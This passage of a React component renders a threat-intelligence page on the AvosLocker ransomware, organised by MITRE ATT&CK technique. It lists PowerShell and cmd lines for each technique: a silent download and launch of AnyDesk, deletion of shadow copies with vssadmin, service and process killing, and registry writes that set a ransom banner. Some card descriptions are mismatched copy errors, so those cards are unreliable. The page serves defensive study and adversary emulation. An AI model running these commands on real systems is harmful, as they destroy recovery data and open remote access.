			<div className='card card-xl-stretch mb-xl-8'>
				<div className='card-header align-items-center border-0 mt-4'>
					<div className='symbol symbol-50px pb-1'>
						<span className='badge badge-dark text-gray-100 fs-5 fw-bold me-1'>T1555</span>
						<span className='text-gray-800 fw-bold mb-1 fs-3'>- Credentials from password stores</span>
					</div>
				</div>
				<div className='card-body pt-3'>
					<div className='text-gray-700 fs-4 mb-7 fst-italic'>Might utilize XenArmor Password Recovery Pro tool to gain credentials.</div>
					
					
					
				</div>
			</div>
		</div>
	</div>
	<div className='fs-1 fw-bold text-gray-800 pt-1 ps-3'>Discovery</div>
	<div className='row g-5 g-xl-8 pt-4'>
		<div className='col-xl-6'>
			<div className='card card-xl-stretch mb-xl-8'>
				<div className='card-header align-items-center border-0 mt-4'>
					<div className='symbol symbol-50px pb-1'>
						<span className='badge badge-dark text-gray-100 fs-5 fw-bold me-1'>T1083</span>
						<span className='text-gray-800 fw-bold mb-1 fs-3'>- File and directory discovery</span>
					</div>
				</div>
				<div className='card-body pt-3'>
					<div className='text-gray-700 fs-4 mb-7 fst-italic'>Searches for specific files and directory related to its ransomware encryption.</div>
					
					<div className='fs-2 fw-bold pb-3'>Command</div>
					<div className='mb-5'>
						<span className='badge badge-light-danger fs-7 fw-bold my-2'>windows</span>
						<span>&nbsp;&nbsp;</span>
						
						<span className='badge badge-light-primary fs-7 fw-bold my-2'>psh</span>
						<span>&nbsp;&nbsp;</span>
					
						<span className='badge badge-light-primary fs-7 fw-bold my-2'>pwsh</span>
						<span>&nbsp;&nbsp;</span>
					
						<div className='fs-5 fw-semibold mt-2 mb-2 ms-5 text-gray-800 fst-italic'>
							<div>&deg;&nbsp;ls -recurse</div>
							<div>&deg;&nbsp;get-childitem -recurse</div>
							<div>&deg;&nbsp;gci -recurse</div>
							
						</div>
					</div>
					
				</div>
			</div>
		</div>
		<div className='col-xl-6'>
			<div className='card card-xl-stretch mb-xl-8'>
				<div className='card-header align-items-center border-0 mt-4'>
					<div className='symbol symbol-50px pb-1'>
						<span className='badge badge-dark text-gray-100 fs-5 fw-bold me-1'>T1135</span>
						<span className='text-gray-800 fw-bold mb-1 fs-3'>- Network share discovery</span>
					</div>
				</div>
				<div className='card-body pt-3'>
					<div className='text-gray-700 fs-4 mb-7 fst-italic'>Network Share Discovery utilizing PowerShell. The computer name variable may need to be modified to point to a different host Upon execution, avalaible network shares will be displayed in the powershell session</div>
					
					<div className='fs-2 fw-bold pb-3'>Command</div>
					<div className='mb-5'>
						<span className='badge badge-light-danger fs-7 fw-bold my-2'>windows</span>
						<span>&nbsp;&nbsp;</span>
						
						<span className='badge badge-light-primary fs-7 fw-bold my-2'>psh</span>
						<span>&nbsp;&nbsp;</span>
					
						<span className='badge badge-light-primary fs-7 fw-bold my-2'>pwsh</span>
						<span>&nbsp;&nbsp;</span>
					
						<div className='fs-5 fw-semibold mt-2 mb-2 ms-5 text-gray-800 fst-italic'>
							<div>&deg;&nbsp;get-smbshare    </div>
							
						</div>
					</div>
					
				</div>
			</div>
		</div>
		<div className='col-xl-6'>
			<div className='card card-xl-stretch mb-xl-8'>
				<div className='card-header align-items-center border-0 mt-4'>
					<div className='symbol symbol-50px pb-1'>
						<span className='badge badge-dark text-gray-100 fs-5 fw-bold me-1'>T1057</span>
						<span className='text-gray-800 fw-bold mb-1 fs-3'>- Process discovery</span>
					</div>
				</div>
				<div className='card-body pt-3'>
					<div className='text-gray-700 fs-4 mb-7 fst-italic'>Utilize Get-Process PowerShell cmdlet to identify processes.</div>
					
					<div className='fs-2 fw-bold pb-3'>Command</div>
					<div className='mb-5'>
						<span className='badge badge-light-danger fs-7 fw-bold my-2'>windows</span>
						<span>&nbsp;&nbsp;</span>
						
						<span className='badge badge-light-primary fs-7 fw-bold my-2'>psh</span>
						<span>&nbsp;&nbsp;</span>
					
						<span className='badge badge-light-primary fs-7 fw-bold my-2'>pwsh</span>
						<span>&nbsp;&nbsp;</span>
					
						<div className='fs-5 fw-semibold mt-2 mb-2 ms-5 text-gray-800 fst-italic'>
							<div>&deg;&nbsp;Get-Process </div>
							
						</div>
					</div>
					
				</div>
			</div>
		</div>
		<div className='col-xl-6'>
			<div className='card card-xl-stretch mb-xl-8'>
				<div className='card-header align-items-center border-0 mt-4'>
					<div className='symbol symbol-50px pb-1'>
						<span className='badge badge-dark text-gray-100 fs-5 fw-bold me-1'>T1018</span>
						<span className='text-gray-800 fw-bold mb-1 fs-3'>- Remote system discovery</span>
					</div>
				</div>
				<div className='card-body pt-3'>
					<div className='text-gray-700 fs-4 mb-7 fst-italic'>Makes use of tools for network scans.</div>
					
					
					
				</div>
			</div>
		</div>
	</div>
	<div className='fs-1 fw-bold text-gray-800 pt-1 ps-3'>Lateral-Movement</div>
	<div className='row g-5 g-xl-8 pt-4'>
		<div className='col-xl-6'>
			<div className='card card-xl-stretch mb-xl-8'>
				<div className='card-header align-items-center border-0 mt-4'>
					<div className='symbol symbol-50px pb-1'>
						<span className='badge badge-dark text-gray-100 fs-5 fw-bold me-1'>T1021</span>
						<span className='text-gray-800 fw-bold mb-1 fs-3'>- Remote services</span>
					</div>
				</div>
				<div className='card-body pt-3'>
					<div className='text-gray-700 fs-4 mb-7 fst-italic'>Might use AnyDesk to remotely connect and transfer files.</div>
					
					
					
				</div>
			</div>
		</div>
		<div className='col-xl-6'>
			<div className='card card-xl-stretch mb-xl-8'>
				<div className='card-header align-items-center border-0 mt-4'>
					<div className='symbol symbol-50px pb-1'>
						<span className='badge badge-dark text-gray-100 fs-5 fw-bold me-1'>T1072</span>
						<span className='text-gray-800 fw-bold mb-1 fs-3'>- Software deployment tools</span>
					</div>
				</div>
				<div className='card-body pt-3'>
					<div className='text-gray-700 fs-4 mb-7 fst-italic'>Used PDQ Deploy to distribute the batch file and payload on target computers.</div>
					
					
					
				</div>
			</div>
		</div>
	</div>
	<div className='fs-1 fw-bold text-gray-800 pt-1 ps-3'>Command-and-Control</div>
	<div className='row g-5 g-xl-8 pt-4'>
		<div className='col-xl-6'>
			<div className='card card-xl-stretch mb-xl-8'>
				<div className='card-header align-items-center border-0 mt-4'>
					<div className='symbol symbol-50px pb-1'>
						<span className='badge badge-dark text-gray-100 fs-5 fw-bold me-1'>T1219</span>
						<span className='text-gray-800 fw-bold mb-1 fs-3'>- Remote access software</span>
					</div>
				</div>
				<div className='card-body pt-3'>
					<div className='text-gray-700 fs-4 mb-7 fst-italic'>Makes use of tools for network scans.</div>
					
					<div className='fs-2 fw-bold pb-3'>Command</div>
					<div className='mb-5'>
						<span className='badge badge-light-danger fs-7 fw-bold my-2'>windows</span>
						<span>&nbsp;&nbsp;</span>
						
						<span className='badge badge-light-primary fs-7 fw-bold my-2'>psh</span>
						<span>&nbsp;&nbsp;</span>
					
						<span className='badge badge-light-primary fs-7 fw-bold my-2'>pwsh</span>
						<span>&nbsp;&nbsp;</span>
					
						<div className='fs-5 fw-semibold mt-2 mb-2 ms-5 text-gray-800 fst-italic'>
							<div>&deg;&nbsp;Invoke-WebRequest -OutFile C:\Users\$env:username\Desktop\AnyDesk.exe https://download.anydesk.com/AnyDesk.exe</div>
							<div>&deg;&nbsp;$file1 = "C:\Users\" + $env:username + "\Desktop\AnyDesk.exe"</div>
							<div>&deg;&nbsp;Start-Process $file1 /S;</div>
							
						</div>
					</div>
					
				</div>
			</div>
		</div>
	</div>
	<div className='fs-1 fw-bold text-gray-800 pt-1 ps-3'>Impact</div>
	<div className='row g-5 g-xl-8 pt-4'>
		<div className='col-xl-6'>
			<div className='card card-xl-stretch mb-xl-8'>
				<div className='card-header align-items-center border-0 mt-4'>
					<div className='symbol symbol-50px pb-1'>
						<span className='badge badge-dark text-gray-100 fs-5 fw-bold me-1'>T1486</span>
						<span className='text-gray-800 fw-bold mb-1 fs-3'>- Data encrypted for impact</span>
					</div>
				</div>
				<div className='card-body pt-3'>
					<div className='text-gray-700 fs-4 mb-7 fst-italic'>Might use AnyDesk to remotely connect and transfer files.</div>
					
					
					<div className='fs-2 fw-bold pb-3'>Encryption algorithm</div>
					<div className='ms-5 mb-5'>
						<span className='badge badge-light-info fs-7 fw-bold my-2'>salsa12</span>
						<span>&nbsp;&nbsp;</span>
						<span className='badge badge-light-info fs-7 fw-bold my-2'>AES-256-CBC</span>
						<span>&nbsp;&nbsp;</span>
						<span className='badge badge-light-info fs-7 fw-bold my-2'>RSA</span>
						<span>&nbsp;&nbsp;</span>
						
					</div>
					<div className='fs-2 fw-bold pb-3'>Added Extension</div>
					<div className='fs-4 fw-semibold mt-2 mb-2 ms-5 text-gray-800 fst-italic'>.avos</div>
						<div className='fs-4 fw-semibold mt-2 mb-2 ms-5 text-gray-800 fst-italic'>.avos2</div>
						
				</div>
			</div>
		</div>
		<div className='col-xl-6'>
			<div className='card card-xl-stretch mb-xl-8'>
				<div className='card-header align-items-center border-0 mt-4'>
					<div className='symbol symbol-50px pb-1'>
						<span className='badge badge-dark text-gray-100 fs-5 fw-bold me-1'>T1489</span>
						<span className='text-gray-800 fw-bold mb-1 fs-3'>- Service stop</span>
					</div>
				</div>
				<div className='card-body pt-3'>
					<div className='text-gray-700 fs-4 mb-7 fst-italic'>Contains a list of services to be terminated to ensure encryption.</div>
					
					<div className='fs-2 fw-bold pb-3'>Command</div>
					<div className='mb-5'>
						<span className='badge badge-light-danger fs-7 fw-bold my-2'>windows</span>
						<span>&nbsp;&nbsp;</span>
						
						<span className='badge badge-light-primary fs-7 fw-bold my-2'>cmd</span>
						<span>&nbsp;&nbsp;</span>
					
						<div className='fs-5 fw-semibold mt-2 mb-2 ms-5 text-gray-800 fst-italic'>
							<div>&deg;&nbsp;sc.exe stop #service_name</div>
							<div>&deg;&nbsp;taskkill.exe /f /im #process_name</div>
							
						</div>
					</div>
					
				</div>
			</div>
		</div>
		<div className='col-xl-6'>
			<div className='card card-xl-stretch mb-xl-8'>
				<div className='card-header align-items-center border-0 mt-4'>
					<div className='symbol symbol-50px pb-1'>
						<span className='badge badge-dark text-gray-100 fs-5 fw-bold me-1'>T1490</span>
						<span className='text-gray-800 fw-bold mb-1 fs-3'>- Inhibit system recovery</span>
					</div>
				</div>
				<div className='card-body pt-3'>
					<div className='text-gray-700 fs-4 mb-7 fst-italic'>Deletes shadow copies.</div>
					
					<div className='fs-2 fw-bold pb-3'>Command</div>
					<div className='mb-5'>
						<span className='badge badge-light-danger fs-7 fw-bold my-2'>windows</span>
						<span>&nbsp;&nbsp;</span>
						
						<span className='badge badge-light-primary fs-7 fw-bold my-2'>cmd</span>
						<span>&nbsp;&nbsp;</span>
					
						<div className='fs-5 fw-semibold mt-2 mb-2 ms-5 text-gray-800 fst-italic'>
							<div>&deg;&nbsp;vssadmin.exe delete shadows /all /quiet</div>
							
						</div>
					</div>
					
				</div>
			</div>
		</div>
		<div className='col-xl-6'>
			<div className='card card-xl-stretch mb-xl-8'>
				<div className='card-header align-items-center border-0 mt-4'>
					<div className='symbol symbol-50px pb-1'>
						<span className='badge badge-dark text-gray-100 fs-5 fw-bold me-1'>T1491</span>
						<span className='text-gray-800 fw-bold mb-1 fs-3'>- Defacement</span>
					</div>
				</div>
				<div className='card-body pt-3'>
					<div className='text-gray-700 fs-4 mb-7 fst-italic'>Display ransom message to users at system start-up by configuring registry keys HKLM\SOFTWARE\Micosoft\Windows\CurrentVersion\Policies\System\LegalNoticeCaption and HKLM\SOFTWARE\Micosoft\Windows\CurrentVersion\Policies\System\LegalNoticeText.</div>
					
					<div className='fs-2 fw-bold pb-3'>Command</div>
					<div className='mb-5'>
						<span className='badge badge-light-danger fs-7 fw-bold my-2'>windows</span>
						<span>&nbsp;&nbsp;</span>
						
						<span className='badge badge-light-primary fs-7 fw-bold my-2'>psh</span>
						<span>&nbsp;&nbsp;</span>
					
						<span className='badge badge-light-primary fs-7 fw-bold my-2'>pwsh</span>
						<span>&nbsp;&nbsp;</span>
					
						<div className='fs-5 fw-semibold mt-2 mb-2 ms-5 text-gray-800 fst-italic'>
							<div>&deg;&nbsp;$orgLegalNoticeCaption = (Get-ItemProperty HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System -Name LegalNoticeCaption).LegalNoticeCaption</div>
							<div>&deg;&nbsp;$orgLegalNoticeText = (Get-ItemProperty HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System -Name LegalNoticeText).LegalNoticeText</div>
							<div>&deg;&nbsp;$newLegalNoticeCaption = "#legal_notice_caption"</div>
							<div>&deg;&nbsp;$newLegalNoticeText = "#legal_notice_text"</div>
							<div>&deg;&nbsp;Set-ItemProperty HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System -Name LegalNoticeCaption -Value $newLegalNoticeCaption -Type String -Force</div>
							<div>&deg;&nbsp;Set-ItemProperty HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System -Name LegalNoticeText -Value $newLegalNoticeText -Type String -Force</div>
							
						</div>
					</div>
					
				</div>
			</div>
		</div>
	</div>
	</>
  )
}

export {Avoslocker}
